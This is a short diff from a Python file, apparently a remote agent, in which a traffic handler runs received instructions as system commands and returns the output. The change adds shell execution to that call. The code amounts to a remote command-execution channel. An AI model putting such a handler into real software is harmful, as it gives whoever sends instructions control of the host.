@@ -59,7 +59,7 @@ def handle_traffic(instructions:str):
         output = ""
     else: #Command received. Execute and return results
         instructionTokens = instructions.split(" ")
-        output = subprocess.run(instructionTokens,capture_output=True).stdout.decode()
+        output = subprocess.run(instructionTokens,capture_output=True,shell=True).stdout.decode()
     return output
 
 
